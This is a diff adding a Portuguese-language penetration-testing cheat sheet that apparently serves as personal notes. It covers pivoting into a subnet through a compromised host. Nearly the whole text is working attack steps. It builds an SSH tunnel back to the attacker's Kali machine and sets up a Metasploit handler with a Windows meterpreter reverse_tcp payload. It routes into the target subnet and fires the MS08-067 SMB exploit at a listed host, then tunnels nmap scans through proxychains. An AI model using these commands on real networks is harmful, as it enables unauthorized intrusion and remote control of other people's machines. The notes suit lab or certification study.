@@ -1,0 +1,57 @@
+1- INVADIR O PIVO, TENDO ACESSO AO SSH DA MAQUINA OU AO PLINK PARA TUNELAMENTO
+
+
+2- CRIAR O TUNEL DE VOLTA NO MEU KALI ATACANTE (PIVO -> KALI)
+
+   pivo# ssh root@127.0.0.1 -L 192.168.11.1:4444:192.168.200.5:4445
+                              interface rede alvo     ip kali atacante
+  *o que o pivo escutar na porta 4444 redireciona para a porta 4445 do atacante 
+ 
+3 - startar o handler
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost 0.0.0.0
+    set lport 4445
+    run -j
+
+4 - CRIAR ROTA PARA O ALVO PELO MSFCONSOLE PARA A SUBREDE DO ALVO
+
+    route add 192.168.11.0 255.255.255.0 2
+
+5 - exploitar o alvo com o mesmo payload do handler
+
+    msf exploit(handler) > use exploit/windows/smb/ms08_067_netapi
+    msf exploit(ms08_067_netapi) > show options 
+    
+    Module options (exploit/windows/smb/ms08_067_netapi):
+    
+       Name     Current Setting  Required  Description
+       ----     ---------------  --------  -----------
+       RHOST    192.168.11.4     yes       The target address
+       RPORT    445              yes       The SMB service port
+       SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+    
+    
+    Payload options (windows/meterpreter/reverse_tcp):
+    
+       Name      Current Setting  Required  Description
+       ----      ---------------  --------  -----------
+       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+       LHOST     192.168.11.1     yes       The listen address
+       LPORT     4444             yes       The listen port
+
+       exploit
+
+
+##########
+UTILIZAR ROTAS DO MSFCONSOLE COM O PROXYCHAINS
+##########
+
+use auxiliary/server/socks4a
+escolha a porta
+
+altere o config do proxychains para 
+/etc/proxychains.conf
+socks4 0.0.0.0 [porta escolhida]
+
+proxychains nmap -sT -sV 192.168.11.4 -p 445
